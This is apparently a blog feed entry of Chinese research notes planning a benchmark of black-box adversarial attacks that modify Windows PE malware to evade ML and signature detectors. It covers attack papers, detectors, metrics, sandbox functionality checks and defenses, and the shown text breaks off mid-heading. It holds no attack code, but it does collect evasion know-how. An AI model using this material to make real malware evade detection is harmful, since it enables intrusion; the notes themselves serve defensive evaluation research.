<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>talk is cheap, show me the code.</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-28T06:31:23.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>theLonging</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>estimation on black-box adversarial-attack</title>
    <link href="http://example.com/2024/07/05/estimation-on-black-box-adversarial-attack/"/>
    <id>http://example.com/2024/07/05/estimation-on-black-box-adversarial-attack/</id>
    <published>2024-07-05T07:42:27.000Z</published>
    <updated>2024-10-28T06:31:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Evaluation of Black-box Portable Executable (PE) Adversarial Attack</p><p>DEADLINE 1.24</p><p>UC</p><p>这周搭建沙盒，看看alive的病毒占比多少</p><p>看看Pesidious能不能跑起来</p><p>先看下Virustotal上有没有关于可执行的报告，有多少数据保持恶意行为</p><p>操作系统可以export出来吗？</p><p>数据集：</p><ul><li>首先还要在沙盒中判定病毒是否alive，<ul><li>要尽可能模拟真实的实验环境，用户数据放到沙盒里，</li><li>签名，网络通信，api，文件活动，文件读写追踪，有没有破坏恶意活动的功能。</li></ul></li></ul><p><strong>10.10 问题：</strong></p><ul><li>已经将数据集全部上传到virustotal上获取报告了，因为AVCLASS需要这个报告对病毒进行分类，当前已全部分类完成</li><li>检查病毒是否alive：实验环境、4gb内存的windows 7 虚拟机。 分析并获取一个病毒的报告需要花费17分钟<ul><li>现在的想法是，将无害的文件上传至沙盒获取baseline，在这个baseline的基础上，如果有新的活动被监控，则认为是alive的</li></ul></li><li>对70个样本分别进行50次最简单的操作（也即随机修改），即3500次操作，需要耗费53分钟，我们现在有1w+的病毒样本</li></ul><p>可复现的论文：</p><p>前面八个是可以浮现的，后面两个暂时还在调试</p><p>需要查询检测器的：</p><ol><li><strong>Learning to Evade Static PE Machine Learning Malware Models via Reinforcement Learning</strong>. <em>Hyrum S. Anderson, Anant Kharkar, Bobby Filar, David Evans, Phil Roth</em>. Arxiv 2018. <code>Black-box</code> [<a href="https://arxiv.org/pdf/1801.08917.pdf">pdf</a>] [<a href="https://github.com/endgameinc/gym-malware">code</a>] ✅<strong>创建了docker</strong>✅ 但是还没有实现docker GPU，实现了，但是好像没有使用GPU</li><li><strong>ARMED: How Automatic Malware Modifications Can Evade Static Detection?</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. International Conference on Information Management 2019. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8714698">pdf</a>] [<a href="https://github.com/zRapha/AIMED">code</a>] ✅<strong>创建了docker</strong>✅</li><li><strong>AIMED: Evolving Malware with Genetic Programming to Evade Detection</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. IEEE International Conference On Trust, Security And Privacy In Computing And Communications&#x2F;IEEE International Conference On Big Data Science And Engineering (TrustCom&#x2F;BigDataSE) 2019. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8887384">pdf</a>] [<a href="https://github.com/zRapha/AIMED">code</a>] ✅<strong>创建了docker</strong>✅</li><li><strong>AIMED-RL: Exploring Adversarial Malware Examples with Reinforcement Learning</strong>. <em>Labaca-Castro, Raphael, Sebastian Franz, Gabi Dreo Rodosek</em>. Joint European Conference on Machine Learning and Knowledge Discovery in Databases (ECML-PKDD) 2021. ✅<strong>创建了docker</strong>✅</li><li><strong>MalwareTotal: Multi-Faceted and Sequence-Aware Bypass Tactics Against Static Malware Detection.</strong> <em>Shuai He and Cai Fu and Hong Hu and Jiahe Chen and Jianqiang Lv and Shuai Jiang Proceedings of the 46th International Conference on Software Engineering (ICSE 2024)</em> 这个也是需要 docker gpu支持的 ✅<strong>创建了docker</strong>✅ 添加了cuda，但是运行时出现cuda out of memory报错</li><li><strong>A Wolf in Sheep’s Clothing: Practical Black-box Adversarial Attacks for Evading Learning-based Windows Malware Detection in the Wild.</strong> <em>USENIX Security Symposium 2024.</em></li><li><strong>MAB-Malware: A Reinforcement Learning Framework for Attacking Static Malware Classifiers</strong>. <em>Wei Song, Xuezixiang Li, Sadia Afroz, Deepali Garg, Dmitry Kuznetsov, Heng Yin</em>. Arxiv 2020. <code>Black-box</code> [<a href="https://arxiv.org/pdf/2003.03100.pdf">pdf</a>] [<a href="https://github.com/bitsecurerlab/adversarial_malware.git">code</a>] ✅<strong>创建了docker</strong>✅</li></ol><p>直接生成样本而不查询检测器的：</p><ol><li><strong>Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes</strong>. <em>Keane Lucas, Mahmood Sharif, Lujo Bauer, Michael K. Reiter, Saurabh Shintre</em>. Arxiv 2019. <code>Black-box and White-box</code> [<a href="https://arxiv.org/pdf/1912.09064.pdf">pdf</a>] [<a href="https://github.com/pwwl/enhanced-binary-diversification">code</a>]✅<strong>创建了docker</strong>✅，目前的想法是现在本地将二进制代码的cfg图通过ida pro收集好，然后一起上传到docker进行突变</li></ol><p>集成商业软件有困难的：</p><ol><li><strong>Functionality-preserving Black-box Optimization of Adversarial Windows Malware</strong>. <em>Luca Demetrio, Battista Biggio, Giovanni Lagorio, Fabio Roli, Alessandro Armando1</em>. IEEE Transactions on Information Forensics and Security 2021. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/abstract/document/9437194">pdf</a>] [<a href="https://github.com/zangobot/secml_malware">code</a>]</li><li><strong>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</strong>. <em>Luca Demetrio, Scott E. Coull, Battista Biggio, Giovanni Lagorio, Alessandro Armando, Fabio Roli</em>. ACM Transactions on Privacy and Security 2021. <code>Black-box and White-box</code> [<a href="https://dl.acm.org/doi/10.1145/3473039">pdf</a>] [<a href="https://github.com/zangobot/secml_malware">code</a>]</li></ol><h1 id="黑盒PE对抗性攻击的评估实验计划"><a href="#黑盒PE对抗性攻击的评估实验计划" class="headerlink" title="黑盒PE对抗性攻击的评估实验计划"></a>黑盒PE对抗性攻击的评估实验计划</h1><ol><li>论文是怎么选的 paper selection 画个表</li><li>复现代码，参数调整是怎么做的，</li><li>sok的工作</li><li>记录跑代码时的issue，什么方法遇到什么问题</li><li>setting</li><li>商用软件的选择的理由</li><li>把评判基准选出来</li></ol><p>实验设计，论文框架，每个实验是要说明什么？数据集怎么设置？</p><h2 id="Attacker-的选择问题"><a href="#Attacker-的选择问题" class="headerlink" title="Attacker 的选择问题"></a>Attacker 的选择问题</h2><ul><li>首先是要找<strong>开源的</strong>、<strong>攻击黑盒检测器</strong>的Attacker</li><li>按照<strong>学习方法</strong>（strategy）分类</li><li>按照<strong>突变操作</strong>（Manipulation）分类</li></ul><table><thead><tr><th align="left">Attacker</th><th>Manipulation</th><th>strategy</th></tr></thead><tbody><tr><td align="left"><strong>Generating Adversarial Malware Examples for Black-Box Attacks Based on GAN</strong>. <em>Weiwei Hu, Ying Tan</em>. Arxiv 2017. <code>Black-box</code> [<a href="https://arxiv.org/pdf/1702.05983.pdf">pdf</a>] [<a href="https://github.com/yanminglai/Malware-GAN">code</a>]</td><td>Add irrelevant API calls</td><td>GAN</td></tr><tr><td align="left">✅<strong>Learning to Evade Static PE Machine Learning Malware Models via Reinforcement Learning</strong>. <em>Hyrum S. Anderson, Anant Kharkar, Bobby Filar, David Evans, Phil Roth</em>. Arxiv 2018. <code>Black-box</code> [<a href="https://arxiv.org/pdf/1801.08917.pdf">pdf</a>] [<a href="https://github.com/endgameinc/gym-malware">code</a>]</td><td>format-preserving modifications</td><td>Reinforcement Learning</td></tr><tr><td align="left">✅<strong>ARMED: How Automatic Malware Modifications Can Evade Static Detection?</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. International Conference on Information Management 2019. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8714698">pdf</a>] [<a href="https://github.com/zRapha/AIMED">code</a>]</td><td>format-preserving modifications</td><td>Randomization</td></tr><tr><td align="left">✅<strong>AIMED: Evolving Malware with Genetic Programming to Evade Detection</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. IEEE International Conference On Trust, Security And Privacy In Computing And Communications&#x2F;IEEE International Conference On Big Data Science And Engineering (TrustCom&#x2F;BigDataSE) 2019. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8887384">pdf</a>] [<a href="https://github.com/zRapha/AIMED">code</a>]</td><td>format-preserving modifications</td><td>Genetic Programming</td></tr><tr><td align="left"><strong>Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors</strong>. <em>Fabricio Ceschin, Marcus Botacin, Heitor Murilo Gomes, L. S. Oliveira, A. Grégio</em>. Reversing and Offensive-Oriented Trends Symposium (ROOTS) 2019. <code>Black-box</code> [<a href="https://github.com/marcusbotacin/Dropper/tree/master/paper">pdf</a>] [<a href="https://github.com/marcusbotacin/Dropper">code</a>]</td><td>Append strings from goodware  &amp; Packing</td><td>Randomization</td></tr><tr><td align="left">✅<strong>Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes</strong>. <em>Keane Lucas, Mahmood Sharif, Lujo Bauer, Michael K. Reiter, Saurabh Shintre</em>. Arxiv 2019. <code>Black-box and White-box</code> [<a href="https://arxiv.org/pdf/1912.09064.pdf">pdf</a>] [<a href="https://github.com/pwwl/enhanced-binary-diversification">code</a>]</td><td>Binary diversification techniques</td><td>Hill-climbing algorithm</td></tr><tr><td align="left">✅<strong>MAB-Malware: A Reinforcement Learning Framework for Attacking Static Malware Classifiers</strong>. <em>Wei Song, Xuezixiang Li, Sadia Afroz, Deepali Garg, Dmitry Kuznetsov, Heng Yin</em>. Arxiv 2020. <code>Black-box</code> [<a href="https://arxiv.org/pdf/2003.03100.pdf">pdf</a>] [<a href="https://github.com/bitsecurerlab/adversarial_malware.git">code</a>]</td><td>format-preserving (macro &amp; micro) modifications</td><td>Weighted Randomization</td></tr><tr><td align="left">✅<strong>AIMED-RL: Exploring Adversarial Malware Examples with Reinforcement Learning</strong>. <em>Labaca-Castro, Raphael, Sebastian Franz, Gabi Dreo Rodosek</em>. Joint European Conference on Machine Learning and Knowledge Discovery in Databases (ECML-PKDD) 2021.</td><td>format-preserving modifications</td><td>Reinforcement Learning</td></tr><tr><td align="left">✅<strong>Functionality-preserving Black-box Optimization of Adversarial Windows Malware</strong>. <em>Luca Demetrio, Battista Biggio, Giovanni Lagorio, Fabio Roli, Alessandro Armando1</em>. IEEE Transactions on Information Forensics and Security 2021. <code>Black-box</code> [<a href="https://ieeexplore.ieee.org/abstract/document/9437194">pdf</a>] [<a href="https://github.com/zangobot/secml_malware">code</a>]</td><td>Inject and pad sections from benign PE files</td><td>Genetic Algorithm</td></tr><tr><td align="left">✅<strong>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</strong>. <em>Luca Demetrio, Scott E. Coull, Battista Biggio, Giovanni Lagorio, Alessandro Armando, Fabio Roli</em>. ACM Transactions on Privacy and Security 2021. <code>Black-box and White-box</code> [<a href="https://dl.acm.org/doi/10.1145/3473039">pdf</a>] [<a href="https://github.com/zangobot/secml_malware">code</a>]</td><td>DOS Header Extension, Content Shifting</td><td>Gradient-based（这里不一定对，因为它是黑盒白盒都有的）</td></tr><tr><td align="left">✅<strong>MalwareTotal: Multi-Faceted and Sequence-Aware Bypass Tactics Against Static Malware Detection.</strong> <em>Shuai He and Cai Fu and Hong Hu and Jiahe Chen and Jianqiang Lv and Shuai Jiang Proceedings of the 46th International Conference on Software Engineering (ICSE 2024)</em></td><td>23个方法</td><td>近端策略优化（PPO）（这个是直接调用api.learn学习）</td></tr><tr><td align="left">✅<strong>A Wolf in Sheep’s Clothing: Practical Black-box Adversarial Attacks for Evading Learning-based Windows Malware Detection in the Wild.</strong> <em>USENIX Security Symposium 2024.</em></td><td>Slack_space &amp; new_section</td><td>MCTS</td></tr><tr><td align="left"><strong>No Need to Teach New Tricks to Old Malware: Winning an Evasion Challenge with XOR-based Adversarial Samples</strong>（需要在windows环境下编译）</td><td>Dropper（将恶意软件插入到良性软件的资源段运行）</td><td>Heuristic-based（这个应该是没有环境交互的，只修改一次的）</td></tr><tr><td align="left"><strong>Black-box Adversarial Attacks Against Deep Learning Based Malware Binaries Detection with GAN</strong> <em>24th European Conference on Artificial Intelligence - ECAI 2020</em>（没有源码）</td><td>经过设计的overlay_append</td><td>GAN</td></tr><tr><td align="left"><strong>Black-Box Adversarial Windows Malware Generation via United Puppet-based Dropper and Genetic Algorithm</strong> <em>IEEE International Conference on High Performance Computing and Communications</em>（没有源码）</td><td>Dropper</td><td>GA</td></tr><tr><td align="left"><strong>A Wolf in Sheep’s Clothing: Query-Free Evasion Attacks Against Machine Learning-Based Malware Detectors with Generative Adversarial Networks</strong> <em>IEEE European Symposium on Security and Privacy</em> <a href="https://github.com/danielgibert/adv_mlw_examples_generation_with_gans">https://github.com/danielgibert/adv_mlw_examples_generation_with_gans</a></td><td></td><td>GAN</td></tr></tbody></table><h2 id="Detector-的选择问题"><a href="#Detector-的选择问题" class="headerlink" title="Detector 的选择问题"></a>Detector 的选择问题</h2><p><del>这是个好问题、我也不知道怎么选</del></p><p><strong>问题：商用杀毒软件没有提供自动化检测的接口、且商用杀毒软件是要付费的</strong></p><ul><li>首先一定要能很好自动化检测的Detector（这是由于我们要集成到不同attacker的接口上）</li><li>Detector的选择一定要多样化，基于<strong>机器学习</strong>的检测器和基于<strong>其他策略</strong>的检测器</li></ul><table><thead><tr><th>Detector</th><th>Paper</th><th>Category</th><th>Architectures</th><th>Features</th></tr></thead><tbody><tr><td>✅EMBER</td><td>Anderson, H. S., Roth, P., 2018. EMBER: an open dataset for training static PE mal- ware machine learning models. ArXiv preprint arXiv:1804.04637.</td><td>static</td><td>LightGBM</td><td>Byte Sequence&amp;Readable String&amp;Header Information</td></tr><tr><td>✅MalConv</td><td>Raff, E., Barker, J., Sylvester, J., Brandon, R., Catanzaro, B., Nicholas, C., 2017. Malware detection by eating a whole EXE. ArXiv preprint arXiv:1710.09435.</td><td>static</td><td>CNN</td><td>Byte Sequence</td></tr><tr><td>✅MalGraph</td><td>Ling, X., Wu, L., Deng, W., Qu, Z., Zhang, J., Zhang, S., Ma, T., Wang, B., Wu, C., Ji, S., 2022. MalGraph: Hierarchical graph neural networks for robust Windows mal- ware detection. In: IEEE Conference on Computer Communications. IEEE, Virtual Event, pp. 1998–2007.</td><td>Static &amp; dynamic</td><td></td><td>Control Flow Graph&amp;Function Call Graph</td></tr><tr><td>✅ClamAV（开源的反病毒软件）</td><td>\</td><td>ClamAV 依赖签名来区分干净文件和恶意&#x2F;不需要的文件。</td><td>\</td><td>signature based</td></tr><tr><td>✅AvastNet</td><td>Krcˇál, M., Švec, O., Bálek, M., Jašek, O., 2018. Deep convolutional malware classifiers can learn from raw executables and labels only. In: International Conference on Learning Representations – Workshop Track. OpenReview.net, Vancouver, BC, Canada, pp. 1–4.</td><td>\</td><td>DNN</td><td>\</td></tr><tr><td>Magic</td><td>Jiaqi Yan, Guanhua Yan, and Dong Jin. Classifying malware represented as control flow graphs using deep graph convolutional neural network. In <em>DSN</em>, 2019.</td><td>\</td><td>CNN</td><td>control flow graphs</td></tr></tbody></table><h4 id="Mal-Graph"><a href="#Mal-Graph" class="headerlink" title="Mal Graph:"></a>Mal Graph:</h4><p><strong>当前检测器存在的问题</strong></p><ul><li>它们忽略了可执行文件中的丰富语义信息，因此无法捕捉恶意软件的内在属性，例如不同函数如何在可执行文件中交互、不同函数的语义是什么等；</li><li>它们无法提供稳健的恶意软件检测，因为它们依赖的表示方式很容易被修改，而不会影响可执行文件的功能。</li></ul><p><strong>本文提出</strong></p><ul><li>函数调用图（FCG）用于学习不同函数之间的交互语义（在函数间级别）</li><li>控制流图（CFG）则用于学习每个函数的结构语义（在函数内部级别）</li></ul><p><strong>本文的主要贡献包括：</strong></p><ul><li>据我们所知，这是首次通过层次化图表示可执行程序，其中大部分结构信息得到了保留和学习。</li><li>我们提出了MalGraph，这是一种基于层次化图的新型层次化图神经网络，能够有效且稳健地检测Windows恶意软件。</li><li>大量评估表明，MalGraph在检测效果和鲁棒性方面均优于三种最先进的基线检测方法。</li></ul><h2 id="Dataset的选择问题"><a href="#Dataset的选择问题" class="headerlink" title="Dataset的选择问题"></a>Dataset的选择问题</h2><ul><li>首先是要多样化，要包含足够丰富的病毒家族</li><li>不支持使用病毒的特征向量，因为从特征向量到二进制程序的过程是不可微的</li><li></li></ul><p>但是选择多大的Dataset合适？</p><h2 id="评价的指标问题"><a href="#评价的指标问题" class="headerlink" title="评价的指标问题"></a>评价的指标问题</h2><p>我们评价一个黑盒对抗性攻击器好坏的指标是什么？</p><ol><li><p><strong>逃逸效率</strong>：能逃逸的检测器越多越好，能逃逸的比例越高越好</p><ul><li><p><strong>Learning to Evade Static PE Machine Learning Malware Models via Reinforcement Learning</strong></p><p>对逃逸率的定义：对同一个恶意软件尝试生成100个对抗性样本，其中如果有80个对抗性样本成功逃逸，逃逸率为80%</p></li><li><p>其他的论文：100个恶意软件有80个成功生成对抗性样本，则逃逸率为80%</p></li></ul></li><li><p>是否<strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>：生成的可以保持恶意功能的对抗性样本的比率越高越好</p><ul><li><code>ARMED、AIMED、AIMED-RL</code>的<code>functionality</code>的检测方法不具备说服力<ul><li>函数<code>malware_analysis</code>：样本在沙盒中运行时间超过<code>15s</code>且报告中没有<code>err</code>，则为<code>functionality</code></li><li>函数<code>malware_analysis_HA</code>：样本报告中含有<code>domains</code>或<code>compromised_hosts</code>，则为<code>functionality</code></li></ul></li><li>&#96;MAB-malware:<ul><li>cuckoo沙盒返回的签名：<code>检测到加密行为 || 原始签名列表中未找到相同签名的数量少于或等于1 ||相似率大于等于 80%</code></li></ul></li><li><code>A Wolf in Sheep’s Clothing</code> <strong>通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率</strong></li><li><code>MalwareTotal:</code> 比较cuckoo返回的签名，如果相同则证明保持了功能性（）</li></ul></li><li><p>生成<strong>对抗性样本的时间效率</strong>：时间越快越好</p></li><li><p><strong>生成对抗性样本的大小</strong>和<strong>原始病毒样本的大小</strong>比较</p></li><li><p>在<strong>哈希狩猎</strong>的表现下如何？</p></li></ol><h2 id="实验设计"><a href="#实验设计" class="headerlink" title="实验设计"></a>实验设计</h2><p><del>针对评价指标设计实验</del></p><ol><li><del><strong>逃逸效率</strong>：</del><ul><li><del>针对基于机器学习的检测器的逃逸效率</del></li><li><del>针对商用检测器的逃逸效率（<strong>既然是黑盒攻击，尝试直接将商用软件集成到攻击模型中</strong>）</del></li><li><del>最后是不是将生成的对抗性样本上传到VirusTotal上获取结果？</del></li></ul></li><li><del>是否<strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>：</del><ul><li><del>检测PE格式：使用python脚本检测PE格式</del></li><li><del>检测可执行性：使用沙盒检测生成样本的可执行性（计划使用开源的Cuckoo Sandbox）</del></li><li><del>检测恶意功能：使用沙盒检测生成样本的恶意功能（计划使用开源的Cuckoo Sandbox、方法采用<em>A Wolf in Sheep’s Clothing</em>中提到的方法：<strong>通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率。</strong>）</del></li></ul></li><li><del>生成对抗性样本的<strong>时间效率</strong>：</del><ul><li><del>这个没啥好说的，直接统计时间就可以了</del></li><li><del>值得注意的是、可以比较一下什么是更高效的搜索算法</del></li></ul></li><li><del><strong>样本大小</strong>的比较</del><ul><li><del>这个直接比较大小就好</del></li></ul></li><li><del><strong>哈希狩猎</strong>下的表现</del><ul><li><del>使用TLSH、SSDEEP比较相似性得分</del></li></ul></li></ol><p><strong>实验框架：</strong></p><ol><li><strong>RQ1:</strong> 面向基于机器学习检测器的攻击性能</li><li><strong>RQ2:</strong> 面向商用检测器的攻击性能</li><li><strong>RQ3:</strong> 生成的对抗性样本是否保持恶意行为？<del>如果没有，破坏样本恶意行为的原因是什么？</del></li><li><strong>RQ4:</strong> 进行消融实验，探究不同的策略和方法的效果怎么样？<strong>挑选前面攻击性能较好的前三个，类别不同的方法，到时候看看有没有必要做消融实验</strong></li><li><strong>RQ5:</strong> 在针对对抗性样本的防御措施下表现怎么样</li><li><strong>RQ6:</strong> 使用SHAP来计算每个特征的重要性</li></ol><p>定义：</p><ul><li><p><strong>逃逸率：</strong><br>$$<br>\text{逃逸率} &#x3D; \frac{\text{生成的逃逸样本数量}}{\text{总样本数量}}<br>$$</p></li><li><p><strong>查询开销：</strong>实现逃避所需的检测器查询次数，我们用其来替代生成时间</p></li><li><p><strong>文件扰动量：</strong>生成的对抗性样本与原样本的大小比较</p></li><li><p><strong>False Positive Rate</strong>（假阳性率）：针对机器学习的模型，取<code>0.1%</code>和<code>1%</code></p></li></ul><ol><li><p><strong>实验一：</strong>对学术上的基于机器学习的检测器的逃逸率：ember、malconv、malgraph；对商用杀毒软件的逃逸率：ClamAV、AVASTNet、。。。（其实这个可以细分成实验一：针对学术的检测器的表现；实验二：针对商用检测器的表现）</p><p>顺便测试一下三种混淆技术的攻击性能？UPX、VMProtect、Enigma，（<code>AWolfInSheep&#39;sClothing</code>测试了）</p><p><strong>需要记录的数据：</strong></p><ul><li>逃逸率：<strong>不同恶意软件类型</strong>的逃逸率、<strong>不同PE文件大小</strong>的逃逸率。</li><li>查询开销</li><li>文件扰动量</li><li><strong>功能完整性</strong>：确认对抗样本在经过修改后仍能执行其恶意行为（这个的评价标准是什么呢？）要不要探究失败的原因呢？（<strong>这个是不是可以单独分成一个实验呢？</strong>）</li></ul><p><strong>问题：</strong></p><ul><li>我们<strong>要不要遵循原paper的参数</strong>，观察各种攻击在商业检测器和学术检测器的逃逸率如何？还是确保所有攻击方法使用相同的攻击参数设置（如查询次数、扰动上限等）以便于横向对比。</li><li>使用<strong>相同的恶意PE样本集</strong>（选择覆盖不同类型和大小的恶意软件），<strong>这会由于一些攻击只针对32位程序而放弃64位程序</strong>。</li><li><strong>商用杀毒软件</strong>的版本、签名库日期等也应保持一致，并在报告中标明，以确保结果的可复现性。这个感觉很难实现，因为商用杀毒软件是联网的，肯定会实时动态更新数据库，可能导致越靠后的实验效果越差。</li></ul></li><li><p><strong>实验二：</strong>消融实验？？针对策略的、针对操作的。</p><ul><li>针对操作：没有必要组合排列测试，直接记录逃逸成功的样本的扰动种类。（这个可以减少实验量）</li><li>针对策略：对于每个样本的扰动次数，针对不同策略的搜索深度，（这个怎么设计呢）</li></ul></li><li><p><strong>实验三：</strong>可能的防御手段</p><ul><li><strong>对抗性训练：</strong>这个是要自己重新训练一个模型。</li><li><strong>基于哈希值的病毒狩猎：</strong>TLSH、ImpHash、SSDeep</li><li><strong>死代码移除、控制流图缩减</strong>：将生成的对抗性样本经过Optimice插件的二进制代码优化处理后，再将其输入到目标恶意软件检测器中进行评估。</li></ul></li><li><p><strong>实验四：</strong>使用SHAP来计算每个特征的重要性？</p></li></ol><h2 id="一些我认为是以前的文章没有做过的工作"><a href="#一些我认为是以前的文章没有做过的工作" class="headerlink" title="一些我认为是以前的文章没有做过的工作"></a>一些我认为是以前的文章没有做过的工作</h2><ol><li>既然对抗性样本和原始病毒样本具有相同的语义、那么在基于<strong>哈希值的病毒狩猎</strong>中、对抗性样本的表现如何？<ul><li>例如 TLSH、ImpHash、SSDeep等</li></ul></li><li>对恶意软件样本进行<strong>分类</strong>、查看不同类别的表现如何、是否有特定的操作对于特定的类别的病毒样本效果很好？</li><li><del>据我所知，这是第一个对黑盒对抗攻击的评估，最终目标是可以做成一个benchmark platform</del></li></ol><h2 id="实验平台搭建："><a href="#实验平台搭建：" class="headerlink" title="实验平台搭建："></a>实验平台搭建：</h2><h3 id="保持PE格式、可执行、恶意功能的检测模块"><a href="#保持PE格式、可执行、恶意功能的检测模块" class="headerlink" title="保持PE格式、可执行、恶意功能的检测模块"></a><strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>的检测模块</h3><ul><li><p>编写python脚本检查PE文件是否保持PE格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：PE二进制文件</span><br><span class="line">输出：是否符合PE文件格式</span><br></pre></td></tr></table></figure></li><li><p>使用Cuckoo 沙盒检查对抗性样本是否可执行？</p></li><li><p>使用Cuckoo 沙盒检查对抗性样本是否维持恶意功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率。</span><br></pre></td></tr></table></figure></li></ul><h3 id="数据集模块"><a href="#数据集模块" class="headerlink" title="数据集模块"></a>数据集模块</h3><p>编写python脚本，使用AVCLASS2对数据集进行分类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：PE二进制文件</span><br><span class="line">输出：分类</span><br></pre></td></tr></table></figure><h3 id="哈希狩猎检测模块"><a href="#哈希狩猎检测模块" class="headerlink" title="哈希狩猎检测模块"></a>哈希狩猎检测模块</h3><p>编写python脚本，计算对抗性样本和原始病毒样本的相似性得分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：对抗性样本，原始病毒样本</span><br><span class="line">输出：得分</span><br></pre></td></tr></table></figure><p>需要注意的是，<strong>判断两个文件相似的阈值</strong>应该设置为多少？</p><h3 id="文件大小比较模块"><a href="#文件大小比较模块" class="headerlink" title="文件大小比较模块"></a>文件大小比较模块</h3><p>编写python脚本，计算对抗性样本和原始病毒样本的大小差异</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：对抗性样本，原始病毒样本</span><br><span class="line">输出：两个文件的大小差异</span><br></pre></td></tr></table></figure><h3 id="攻击器的生成效率"><a href="#攻击器的生成效率" class="headerlink" title="攻击器的生成效率"></a>攻击器的生成效率</h3><p>这个直接计算生成样本消耗的时间就可以了</p><p>控制变量法：相同的数据集，攻击相同的检测器，迭代次数是不是要相同？最终生成的对抗性样本数量肯定是不同的，这个问题该如何解决？</p><h3 id="黑盒检测器接口模块"><a href="#黑盒检测器接口模块" class="headerlink" title="黑盒检测器接口模块"></a>黑盒检测器接口模块</h3><p>修改不同攻击器攻击的黑盒检测器模块，使其成为一个接口，能向攻击器返回不同检测器反馈的结果。（这一部分应该是最难的点）</p><h1 id="现有survey的优缺点"><a href="#现有survey的优缺点" class="headerlink" title="现有survey的优缺点"></a>现有survey的优缺点</h1><h2 id="Adversarial-Attacks-against-Windows-PE-Malware-Detection-A-Survey-of-the-State-of-the-Art-Computer-amp-Security-2023"><a href="#Adversarial-Attacks-against-Windows-PE-Malware-Detection-A-Survey-of-the-State-of-the-Art-Computer-amp-Security-2023" class="headerlink" title="Adversarial Attacks against Windows PE Malware Detection: A Survey of the State-of-the-Art; Computer &amp; Security 2023"></a>Adversarial Attacks against Windows PE Malware Detection: A Survey of the State-of-the-Art; <code>Computer &amp; Security 2023</code></h2><p><strong>论文贡献</strong></p><ol><li>强调了<strong>保持PE格式</strong>、<strong>保持可执行性</strong>、<strong>保持恶意性</strong></li><li>提出了一个<strong>完整的分类法</strong></li><li>总结了现有针对<strong>PE恶意软件检测的对抗性攻击</strong>和<strong>防御措施</strong></li></ol><h3 id="Pros"><a href="#Pros" class="headerlink" title="Pros:"></a>Pros:</h3><p>分别对attacker和detector进行了分类和总结：</p><ul><li><p>对检测器的分类（基于特征工程）：</p><ul><li>静态特征：<ul><li>字节序列</li><li>可读字符串</li><li>头信息</li><li>灰度图像</li></ul></li><li>动态特征：<ul><li>系统资源状态</li><li>文件状态</li><li>注册表状态</li><li>网络状态</li></ul></li><li>混合特征：<ul><li>操作码</li><li>系统&#x2F;API调用</li><li>控制流程图（CFG）</li><li>函数调用图</li></ul></li></ul></li><li><p><strong>对抗性攻击的分类</strong>：</p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-05%2016.01.05.png" alt="截屏2024-07-05 16.01.05"></p></li></ul><p>提出了未来的研究方向：</p><ol><li>Strong Demands for Robust PE Malware Detection</li><li>Practical and Efficient Adversarial Attacks against Commercial Anti-viruses in the Wild</li><li>Lack of Benchmark Platforms for Research</li></ol><h3 id="Cons"><a href="#Cons" class="headerlink" title="Cons:"></a>Cons:</h3><ul><li>贡献中提到的<strong>保持PE格式</strong>、<strong>保持可执行性</strong>、<strong>保持恶意性</strong>并没有通过<strong>实验数据的佐证</strong></li><li>survey没有衡量attacker得各项指标</li></ul><h3 id="Argue"><a href="#Argue" class="headerlink" title="Argue:"></a>Argue:</h3><ul><li>Benchmark Platform for Research 是一个很好的工作（<strong>但这个工作可能比较遥远</strong>）</li><li>除了Attack Strategy的总结、是否要对attack manipulation进行总结、对attack manipulation的细化到什么程度</li></ul><h2 id="A-comparison-of-adversarial-malware-generators-Journal-of-Computer-Virology-and-Hacking-Techniques-2024"><a 